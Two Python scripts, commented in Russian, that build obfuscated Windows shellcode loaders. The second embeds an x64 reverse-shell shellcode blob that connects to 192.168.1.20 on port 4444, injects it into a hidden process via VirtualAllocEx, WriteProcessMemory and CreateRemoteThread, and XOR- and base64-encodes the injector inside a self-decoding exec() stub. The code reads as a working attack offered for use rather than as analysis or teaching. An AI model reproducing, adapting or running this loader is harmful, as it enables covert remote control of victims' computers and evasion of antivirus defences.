import base64

buf =  b""

bb = ''.join(f'\\x{b:02x}' for b in buf)
text = f'''
import ctypes
from ctypes import wintypes
buf = b"{bb}"
kernel32 = ctypes.windll.kernel32
kernel32.GetCurrentProcess.restype = wintypes.HANDLE
kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
kernel32.VirtualAllocEx.restype = wintypes.LPVOID
kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
kernel32.WriteProcessMemory.restype = wintypes.BOOL
current_process = kernel32.GetCurrentProcess()
sc_memory = kernel32.VirtualAllocEx(current_process, None, len(buf), 0x1000, 0x40)
bytes_written = ctypes.c_size_t(0)
kernel32.WriteProcessMemory(current_process, sc_memory,ctypes.c_char_p(buf),len(buf),ctypes.byref(bytes_written))
shell_func = ctypes.CFUNCTYPE(None)(sc_memory)
shell_func()
'''
key = b'password123'
x = bytearray(b ^ key[i % len(key)] for i, b in enumerate(text.encode("utf-8")))
with open('bin.txt', 'w') as f:
    f.write(base64.b64encode(x).decode('ascii'))


---------------------------------------------------------------------


import base64

key = b'aron'
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x51"
buf += b"\x48\x8b\x52\x18\x56\x48\x8b\x52\x20\x4d\x31\xc9"
buf += b"\x48\x0f\xb7\x4a\x4a\x48\x8b\x72\x50\x48\x31\xc0"
buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b"
buf += b"\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
buf += b"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48"
buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48"
buf += b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0"
buf += b"\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1"
buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
buf += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
buf += b"\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49"
buf += b"\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
buf += b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
buf += b"\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x14\x41\x54"
buf += b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
buf += b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
buf += b"\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50"
buf += b"\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89"
buf += b"\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf"
buf += b"\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
buf += b"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
buf += b"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00"
buf += b"\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9"
buf += b"\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8"
buf += b"\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20"
buf += b"\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00"
buf += b"\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4"
buf += b"\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
buf += b"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba"
buf += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"
buf += b"\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00"
buf += b"\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41"
buf += b"\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c"
buf += b"\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6"
buf += b"\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
buf += b"\xf0\xb5\xa2\x56\xff\xd5"

bb = ''.join(f'\\x{b:02x}' for b in buf)
task= f'''
import ctypes
from ctypes import wintypes
buf = b"{bb}"
command_line = "C:\\Program Files\\Windows Photo Viewer\\ImagingDevices.exe"
#command_line = "C:\\Windows\\System32\\cmd.exe"
'''
task += '''
import time
STARTF_USESHOWWINDOW = 0x00000001
SW_HIDE = 0  # Режим скрытого окна
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_READ = 0x0010
PROCESS_ACCESS_FLAGS = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ('cb', wintypes.DWORD),
        ('lpReserved', wintypes.LPWSTR),
        ('lpDesktop', wintypes.LPWSTR),
        ('lpTitle', wintypes.LPWSTR),
        ('dwX', wintypes.DWORD),
        ('dwY', wintypes.DWORD),
        ('dwXSize', wintypes.DWORD),
        ('dwYSize', wintypes.DWORD),
        ('dwXCountChars', wintypes.DWORD),
        ('dwYCountChars', wintypes.DWORD),
        ('dwFillAttribute', wintypes.DWORD),
        ('dwFlags', wintypes.DWORD),
        ('wShowWindow', wintypes.WORD),
        ('cbReserved2', wintypes.WORD),
        ('lpReserved2', ctypes.POINTER(ctypes.c_byte)),
        ('hStdInput', wintypes.HANDLE),
        ('hStdOutput', wintypes.HANDLE),
        ('hStdError', wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('hProcess', wintypes.HANDLE),
        ('hThread', wintypes.HANDLE),
        ('dwProcessId', wintypes.DWORD),
        ('dwThreadId', wintypes.DWORD),
    ]

kernel32 = ctypes.windll.kernel32
kernel32.CreateProcessW.argtypes = [
    wintypes.LPCWSTR, wintypes.LPWSTR, ctypes.c_void_p, ctypes.c_void_p, 
    wintypes.BOOL, wintypes.DWORD, ctypes.c_void_p, wintypes.LPCWSTR, 
    ctypes.POINTER(STARTUPINFOW), ctypes.POINTER(PROCESS_INFORMATION)
]
kernel32.CreateProcessW.restype = wintypes.BOOL
kernel32.CreateRemoteThread.argtypes = [
    wintypes.HANDLE,      # 1. hProcess
    ctypes.c_void_p,      # 2. lpThreadAttributes
    ctypes.c_size_t,      # 3. dwStackSize
    ctypes.c_void_p,      # 4. lpStartAddress (СЮДА ПЕРЕДАЕТСЯ sc_memory — должен быть c_void_p!)
    ctypes.c_void_p,      # 5. lpParameter
    wintypes.DWORD,       # 6. dwCreationFlags
    ctypes.POINTER(wintypes.DWORD) # 7. lpThreadId
]
kernel32.CreateRemoteThread.restype = wintypes.HANDLE
kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
kernel32.OpenProcess.restype = wintypes.HANDLE

kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,   # 1. hProcess
    ctypes.c_void_p,   # 2. lpAddress
    ctypes.c_size_t,   # 3. dwSize
    wintypes.DWORD,    # 4. flAllocationType (Сюда передается 0x1000 или MEM_COMMIT)
    wintypes.DWORD     # 5. flProtect
]
kernel32.VirtualAllocEx.restype = ctypes.c_void_p 

kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
kernel32.WriteProcessMemory.restype = wintypes.BOOL

kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.CloseHandle.restype = wintypes.BOOL

si = STARTUPINFOW()
si.cb = ctypes.sizeof(STARTUPINFOW)
si.dwFlags = STARTF_USESHOWWINDOW
si.wShowWindow = SW_HIDE  # Скрываем графическое окно

pi = PROCESS_INFORMATION()

print("[*] Запуск скрытого процесса Chrome...")

# 2. Запуск процесса
create_success = kernel32.CreateProcessW(
	None, command_line, None, None, False, 0, None, None, ctypes.byref(si), ctypes.byref(pi)
)
time.sleep(2)
if not create_success:
	print(f"[-] Ошибка CreateProcessW. Код: {kernel32.GetLastError()}")

target_pid = pi.dwProcessId
print(f"[+] Процесс запущен успешно.")
print(f"[+] Получен target_pid: {target_pid}")

kernel32.CloseHandle(pi.hProcess)
kernel32.CloseHandle(pi.hThread)
print(f"[*] Запрос дескриптора для PID {target_pid} через OpenProcess...")
h_process = kernel32.OpenProcess(PROCESS_ACCESS_FLAGS, False, target_pid)

if not h_process:
	print(f"[-] Ошибка OpenProcess (Возможно, не хватает прав или сработал антивирус). Код: {kernel32.GetLastError()}")

	
print(f"[+] Успешно получен h_process (HANDLE): {h_process}")

try:
	remote_memory = kernel32.VirtualAllocEx(h_process, None, len(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	
	if not remote_memory:
		print(f"[-] Ошибка VirtualAllocEx в удаленном процессе. Код: {kernel32.GetLastError()}")

		
	print(f"[+] Память в Chrome выделена по адресу: {hex(remote_memory)}")

	bytes_written = ctypes.c_size_t(0)
	write_success = kernel32.WriteProcessMemory(h_process, remote_memory, ctypes.c_char_p(buf), len(buf), ctypes.byref(bytes_written))
	thread_id = wintypes.DWORD(0)
	h_thread = kernel32.CreateRemoteThread(
	    h_process,         # Дескриптор Chrome, полученный из OpenProcess
	    None, 
	    0, 
	    remote_memory,         # Адрес памяти внутри Chrome, куда был записан buf
	    None, 
	    0, 
	    ctypes.byref(thread_id)
	)
	
	if write_success:
		print(f"[+] Успешно записано {bytes_written.value} байт в адресное пространство Chrome.")
	else:
		print(f"[-] Ошибка WriteProcessMemory. Код: {kernel32.GetLastError()}")
		
finally:
	#kernel32.CloseHandle(h_process)
	print("[*] Дескриптор h_process успешно закрыт.")
'''
x = bytearray(b ^ key[i % len(key)] for i, b in enumerate(task.encode("utf-8")))

text = f'''
key = {key}
task = {x}
x = bytearray(b ^ key[i % len(key)] for i, b in enumerate(task))
exec(x.decode('utf-8'))
'''

with open('text.txt', 'w') as f:
    f.write(base64.b64encode(text.encode("utf-8")).decode('utf-8'))
